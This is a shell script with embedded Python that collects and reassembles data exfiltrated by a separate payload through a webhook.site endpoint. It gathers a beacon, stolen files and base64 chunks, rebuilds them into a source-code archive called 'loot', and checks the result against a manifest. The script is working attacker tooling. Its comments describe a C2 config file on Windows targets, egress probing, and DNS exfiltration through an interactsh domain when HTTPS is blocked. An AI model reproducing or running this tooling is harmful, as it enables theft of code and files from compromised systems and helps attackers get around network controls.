#!/usr/bin/env bash
#
# pull-exfil.sh — collect and reassemble an exfil run from a webhook.site token.
#
#   ./pull-exfil.sh <token-uuid> [outdir]
#
# Endpoints written by the payload: hello, f-<name>, manifest, c<i>, done.
# Text artifacts are written as-is; chunked blobs are concatenated, checked
# against size + SHA-256 from the manifest, and extracted.
#
# Safe to re-run: anything already collected is skipped, and the payload's
# channel is idempotent, so re-running after an interruption resumes.

set -uo pipefail

TOKEN="${1:-}"
OUT="${2:-loot}"
[ -n "$TOKEN" ] || { echo "usage: $0 <webhook.site-token-uuid> [outdir]" >&2; exit 1; }

API="https://webhook.site/token/$TOKEN/requests"
PY="${PYTHON:-}"
if [ -z "$PY" ]; then
  if command -v python3 >/dev/null 2>&1; then PY=python3
  elif command -v py >/dev/null 2>&1; then PY=py
  else echo "no python3/py on PATH" >&2; exit 1; fi
fi
DEADLINE=$(( $(date +%s) + ${WATCH_SECS:-300} ))

mkdir -p "$OUT/files"
echo "[*] polling (Ctrl-C to stop, re-run to resume) — watching for 'hello'"
echo "[*] dashboard: https://webhook.site/#!/$TOKEN"

hello=0
for attempt in $(seq 1 240); do
  res=$("$PY" - "$API" "$OUT" <<'PY'
import base64, json, os, sys, urllib.request

api, out = sys.argv[1], sys.argv[2]
try:
    req = urllib.request.Request(
        api + "?sorting=newest&per_page=100",
        headers={"Accept": "application/json",
                 "User-Agent": "pull-exfil/2"})
    with urllib.request.urlopen(req, timeout=25) as r:
        raw = r.read()
    data = json.loads(raw) if raw.strip() else {}
except Exception as e:
    print("ERR " + type(e).__name__ + ": " + str(e)[:120])
    raise SystemExit(0)

new = 0
for q in (data.get("data") or []):
    path = (q.get("url") or "").rstrip("/").split("/")[-1]
    body = q.get("content") or ""
    if not path:
        continue
    if path == "hello":
        p = os.path.join(out, "hello.txt")
        if not os.path.exists(p):
            open(p, "w").write(body); new += 1; print("HELLO")
    elif path.startswith("f-"):
        p = os.path.join(out, "files", path[2:])
        if not os.path.exists(p):
            open(p, "w").write(body); new += 1
    elif path == "manifest":
        p = os.path.join(out, "manifest.txt")
        if not os.path.exists(p):
            open(p, "w").write(body); new += 1; print("MANIFEST")
    elif path == "done":
        p = os.path.join(out, ".done")
        if not os.path.exists(p):
            open(p, "w").write("1"); new += 1; print("DONE")
    elif path.startswith("c") and path[1:].isdigit():
        p = os.path.join(out, "chunk-%05d.b64" % int(path[1:]))
        if not os.path.exists(p):
            open(p, "w").write(body); new += 1
if new:
    print("NEW %d" % new)
PY
)
  case "$res" in
    *ERR*) echo "  $res" ;;
    *HELLO*) hello=1; echo "[+] payload executed — beacon received: $(cat "$OUT/hello.txt" 2>/dev/null)" ;;
    *MANIFEST*) echo "[+] manifest received" ;;
    *NEW*) echo "  $res" ;;
  esac
  [ -f "$OUT/.done" ] && { echo "[+] transfer complete"; break; }
  [ "$(date +%s)" -ge "$DEADLINE" ] && { echo "[*] watch window over"; break; }
  sleep 5
done

if [ "$hello" -ne 1 ] && [ ! -f "$OUT/hello.txt" ]; then
  cat >&2 <<'EOF'
[!] no hello beacon. In priority order:
    1. Did the payload actually run? A cast/InvalidCastException page means yes
       (the assembly loaded); 0.2s and no artifacts means it did not.
    2. Is the config in place? It must be C:\Windows\Temp\c2.txt — older runners
       wrote <epoch>.txt instead, which the payload could not find.
    3. Is egress filtered? Run ./run.sh egress — the response time is the answer.
    4. HTTPS blocked but DNS open? Set DNS_DOMAIN=<interactsh domain>.
    5. Everything blocked? ./run.sh writemap, then DROPS='<served dir>'.
EOF
fi

# Text artifacts are sent raw. Save them as-is (and keep a base64 decode if it
# happens to be one, so old and new payloads both land).
for f in "$OUT"/files/*; do
  [ -e "$f" ] || continue
  printf '  %s  %s bytes\n' "$(basename "$f")" "$(wc -c < "$f" | tr -d ' ')"
done

if ! ls "$OUT"/chunk-*.b64 >/dev/null 2>&1; then
  echo "[!] no chunks — no src.zip was shipped (small loot only)" >&2
  exit 1
fi

cat "$OUT"/chunk-*.b64 > "$OUT/src.b64"
"$PY" - "$OUT" <<'PY'
import base64, hashlib, os, sys
out = sys.argv[1]
try:
    raw = base64.b64decode("".join(open(os.path.join(out, "src.b64")).read().split()))
except Exception as e:
    print("[!] chunk decode failed:", e); raise SystemExit(1)

man = {}
try:
    man = dict(kv.split("=", 1) for kv in open(os.path.join(out, "manifest.txt")).read().split("&"))
except Exception:
    pass

open(os.path.join(out, "src.zip"), "wb").write(raw)
print("[*] bytes:", len(raw))

bad = False
if man.get("size") and man["size"] != str(len(raw)):
    print("[!] size MISMATCH: manifest", man["size"], "got", len(raw)); bad = True
if man.get("b64") and man["b64"] != str(sum(len(open(p).read().strip()) for p in
        sorted(__import__("glob").glob(os.path.join(out, "chunk-*.b64"))))):
    print("[!] chunk length mismatch (extra or truncated chunks)"); bad = True
if man.get("sha"):
    got = hashlib.sha256(raw).hexdigest()
    print("[*] sha256:", "MATCH" if got.lower() == man["sha"].lower() else "MISMATCH")
    bad = bad or got.lower() != man["sha"].lower()
if man.get("chunks"):
    n = len(__import__("glob").glob(os.path.join(out, "chunk-*.b64")))
    if str(n) != man["chunks"]:
        print("[!] expected", man["chunks"], "chunks, have", n)
raise SystemExit(2 if bad else 0)
PY
rc=$?

(cd "$OUT" && unzip -o -q src.zip -d src 2>/dev/null && echo "[+] extracted to $OUT/src")
[ "$rc" -eq 0 ] || echo "[!] archive is incomplete — re-run this script to pick up missing chunks"
